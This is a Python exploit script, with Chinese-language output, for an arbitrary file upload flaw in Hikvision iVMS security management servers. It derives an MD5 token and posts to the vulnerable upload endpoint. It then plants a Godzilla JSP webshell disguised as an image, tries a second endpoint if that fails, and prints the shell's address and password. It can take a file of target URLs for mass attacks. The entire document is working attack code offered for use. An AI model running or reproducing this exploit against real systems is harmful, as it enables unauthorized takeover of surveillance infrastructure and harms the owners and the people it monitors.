import requests
import urllib3
import urllib
import hashlib
import json
import argparse
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()


head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}

def title():
    print("* " * 20)
    print("[+]漏洞名称：海康威视iVMS 综合安防任意文件上传")
    print("[+]漏洞编号：暂无")
    print("[+]发现时间：2023-05-19")
    print("[+]Author：维维豆奶-dave")
    print("* " * 20)

def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return (input_name.hexdigest()).upper()

def poc(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
        service = "home/index.action"
    else:
        path = "/eps/api/resourceOperations/upload?token="
        service = "/home/index.action"
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + service)
    }
    try:
        response = requests.post(url=pocurl,headers=head,data=data,verify=False,timeout=3)
        if response.status_code==200:
            print(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞")
    except:
        pass

def expgsl(url):
    files = {
        "fileUploader": ("gsl.jsp", open("gsl.jsp", "rb"), "images/jpeg")
    }
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
    else:
        path = "/eps/api/resourceOperations/upload?token="
    pocurl = url + path + md5encode(url)
    try:
        response = requests.post(url=pocurl,headers=head,files=files,verify=False,timeout=3).text
        if "上传附件成功" in response:
            print(Fore.GREEN + f"[+]Webshell上传成功")
            webshellpath = json.loads(response)['data']['resourceUuid']
            if url.endswith("/"):
                wpath = "eps/upload/"
            else:
                wpath = "/eps/upload/"
            webshell = url + wpath + "".join(webshellpath) + ".jsp"
            print(Fore.GREEN + f"[+]Webshell地址为:{webshell},使用哥斯拉连接，密码pass")
        else:
            print(Fore.RED + f"[-]webshell上传失败,尝试使用action上传")
            expgsl2(url)
    except:
        pass

def expgsl2(url):
    files = {
        "fileUploader": ("gsl.jsp", open("gsl.jsp", "rb"), "images/jpeg")
    }
    if url.endswith("/"):
        path = "eps/resourceOperations/upload.action"
    else:
        path = "/eps/resourceOperations/upload.action"
    pocurl = url + path
    try:
        response = requests.post(url=pocurl, headers=head, files=files, verify=False, timeout=3).text
        if "上传附件成功" in response:
            print(Fore.GREEN + f"[+]Webshell上传成功")
            webshellpath = json.loads(response)['data']['resourceUuid']
            if url.endswith("/"):
                wpath = "eps/upload/"
            else:
                wpath = "/eps/upload/"
            webshell = url + wpath + "".join(webshellpath) + ".jsp"
            print(Fore.GREEN + f"[+]Webshell地址为:{webshell},使用哥斯拉连接，密码pass")
        else:
            print(Fore.RED + f"[-]action方法webshell上传失败")
    except:
        pass


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(usage='python3 ivms.py -u http://xxxx\npython3 ivms.py -f file.txt',
                                     description='ivms漏洞利用exp',
                                     )
    p = parser.add_argument_group('ivms 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if not args.url and not args.file:
        print("请输入 -u 参数指定 URL 地址：python3 exp.py -u url")
        parser.print_help()
        exit()
    if args.url:
        poc(args.url)
        expgsl(args.url)
    if args.file:
        for i in open(args.file,"r").read().split("\n"):
            poc(i)
            expgsl(i)
